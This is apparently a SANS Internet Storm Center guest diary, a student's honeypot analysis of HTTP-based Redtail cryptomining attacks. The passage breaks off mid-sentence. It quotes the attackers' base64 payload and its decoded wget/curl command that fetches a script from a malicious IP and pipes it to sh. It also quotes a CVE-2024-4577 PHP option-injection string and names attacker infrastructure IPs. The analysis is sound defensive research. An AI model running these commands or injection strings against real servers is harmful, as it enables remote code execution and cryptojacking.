---
title: Danger of Libredtail &#x5b;Guest Diary&#x5d;, (Wed, Apr 29th)
url: https://isc.sans.edu/diary/rss/32936
source: SANS Internet Storm Center, InfoCON: green
date: 2026-04-30
fetch_date: 2026-05-01T05:39:56.163834
---

# Danger of Libredtail &#x5b;Guest Diary&#x5d;, (Wed, Apr 29th)

# [Internet Storm Center](/)

[Sign In](/login.html)
[Sign Up](/register.html)

Handler on Duty: [Guy Bruneau](/handler_list.html#guy-bruneau "Guy Bruneau")

Threat Level: [green](/infocon.html)

* [previous](/diary/32934)

Click HERE to learn more about classes Guy is teaching for SANS

# [Danger of Libredtail [Guest Diary]](/forums/diary/Danger%2Bof%2BLibredtail%2BGuest%2BDiary/32936/)

**Published**: 2026-04-29. **Last Updated**: 2026-04-30 00:07:03 UTC
**by** [James Roberts, SANS.edu BACS Student](/handler_list.html#james-roberts,-sans.edu-bacs-student) (Version: 1)

[0 comment(s)](/diary/Danger%2Bof%2BLibredtail%2BGuest%2BDiary/32936/#comments)

[This is a Guest Diary by James Roberts, an ISC intern as part of the SANS.edu [BACS](https://www.sans.edu/cyber-security-programs/bachelors-degree/) program]

Over the last few months, I have gained valuable experience working with the Internet Storm Center (ISC) operating a honeypot and analyzing its output via a [SIEM](https://github.com/bruneaug/DShield-SIEM/blob/main/README.md) environment.  This work gave me hands on experience with system set on a Raspberry Pi environment, utilizing command line interfaces, SIEM deployment, networking, and information analysis.  This experience was also a good demonstration of difficulty of finding useful information in a sea of logged data and how to find interesting items within it.  Some of the most interesting items were indicators relating to cryptomining malware.

**DShield Honeypot**

The DShield sensor is a honeypot system that information from HTTP, telnet, SSH, and firewall logs.  When deployed, it uses a Cowrie honeypot to simulate a Debian system to capture SSH and Telnet interactions, web.py and tcp-honeypot.py to simulate various services and obtain HTTP and TCP interactions, and finally scripts to collect, process and submit these and firewall logs.  These logs are sent to ISC, as well as an ELK SIEM that is set up on another system of mine.  With the SIEM, I was better able to parse, research, and understand the information produced by the various DShield logs.  Sometimes I would see something more interesting than just a standard SSH login attempt

**Identifying Something Interesting**

Around the halfway point in my internship, I did an attack observation about a type of cryptomining malware known as redtail.  After completing that observation, I noticed that there was another, different, variety of redtail based attacks I had previously not noticed, this time operating via HTTP instead of SSH/telnet.

![](https://isc.sans.edu/diaryimages/images/James_Roberts_pic1(3).png)

As the most commonly occurring User Agent, and one of the most common items of HTTP information over the entire course of my DShield sensor’s deployment, I felt compelled to investigate further.

**Overview of the Culprits**

While I had 113 different IP addresses perform libertail-http activity on the DShield sensor, I am opting to focus my observation on the top three IP addresses for the sake of simplicity.

![](https://isc.sans.edu/diaryimages/images/James_Roberts_pic2(1).png)

All three of these IP addresses attempted to perform the same attack multiple times over the course of several days.  The IP addresses came from different counties, Germany, Great Britain, and India.  All the observed libertail-http Ip addresses had similar general HTTP behavior, though there are some exceptions.  Most of the IP addresses observed additionally attempted to log in to the honeypot via SSH, as well as performing a SYN scan.

![](https://isc.sans.edu/diaryimages/images/James_Roberts_pic3.png)

![](https://isc.sans.edu/diaryimages/images/James_Roberts_pic4.png)

IP addresses 82.165.66.87 and 103.40.61.98 are almost identical in their behavior, even both exclusively using the same Username/Password login combination (admin/admin).  It is likely all the attackers are actually bots, but these two are likely using the same script to perform the same probing activity.  Based on other information that will be seen later, they might actually be the same attacker using different IP addresses.  Their behaviors are also more representative of the behavior observed by other attackers.  IP address 2.27.53.96 is much more aggressive in its attempt to log in with SSH and is less aggressive about the number of ports it scans.  Much of its activity is still similar to the other observed IP addresses, but it is unique in some ways.

**Patterns of Behavior**

Each of the attacks begins with a series of four HTTP POST actions.

From IP 103.10.61.98 on March 27 0623UTC

http.request.body            http.response.body.content                      url.query
![](https://isc.sans.edu/diaryimages/images/James_Roberts_pic5.png)
![](https://isc.sans.edu/diaryimages/images/James_Roberts_pic6.png)

The first two POST actions are effectively the same, with the only difference being that the first one uses URL encoding to traverse to /bin/sh while the second one doesn’t.  This directory traversal is attempting to look for CGI misconfigurations and allow the use of /bin/sh for command execution.  Additionally there is an attempt to connect to 31.57.216.121/sh through wget and curl.  On March 3, similar behaviors were logged for 178.16.55.224/sh instead.  IP address 82.165.66.87 also attempts to connect to both of these address as well and IP 2.27.53.96 additionally used 46.151.182.82.  After connecting via SH to an address, apache.selfrep is run.  Based on the name, apache.selfrep is likely a script designed to maintain persistence on a target.  IPs 31.57.216.121, 178.16.55.224, and 46.151.182.82 are known malicious IP addresses associated with cyrptomining malware infrastructure.  The url.query is the request.body information in its more original state, which is in base64.  The base64 encoding was likely done to obfuscate the attack or to more reliably deliver the attack against a wider variety of system or both.

The next two POST actions related directly to CVE-2024-4577, an exploit strongly associated with redtail malware that targets PHP services.  The request body line ”: d+allow\_url\_include=1+ d+auto\_prepend\_file=php://input” takes advantage of older PHP versions  flaw of replacing certain characters given into something else using a “Best-Fit” behavior that misinterprets characters as PHP options and allows running arbitrary PHP code.  In this case, that arbitrary code is being used to the inclusion of extra input from the HTTP request body.  That request body input accesses shell.exe and sends a base64 encoded set of commands
“KHdnZXQgLS1uby1jaGVjay1jZXJ0aWZpY2F0ZSAtcU8tIGh0dHBzOi8vMzEuNTcuMjE2LjEyMS9zaCB8fCBjdXJsIC1zayBodHRwczovLzMxLjU3LjIxNi4xMjEvc2gpIHwgc2ggLXMgY3ZlXzIwMjRfNDU3Ny5zZWxmcmVw”.  This can be decoded into (wget --no-check-certificate -qO- https://31.57.216.121/sh || curl -sk https://31.57.216.121/sh) | sh -s cve\_2024\_4577.selfrep). This is very similar commands found in the previous POST commands, running cve\_2024\_4577.selfrep as a different script.  Additionally, echo(md5("Hello CVE-2024-4577") is also run to print a message to indicate the previous commands have run correctly.  Like the other POST actions, the original query was encoded in base64.

Next the attack begins probing various .php installation paths.  The paths are requested, with “<?php echo(md5("Hello PHPUnit"));” created as a response if the requested path is found.  This reconnaissance is likely being done to map out what specific type of PHP is available and by extension what other vulnerabilities could be utilized in the future.

From IP 82.165.66.87 on March 27 12:55 UTC

http.request.body.content                                             http.response.body.content
![](https://isc.sans.edu/diaryimages/images/James_Roberts_pic7.png)

In addition to the HTTP interactions, the IP addresses also attempt to interact with the honeypot by logging on via SSH and engaging in SYN scans on various ephemeral ports.  If a SSH l...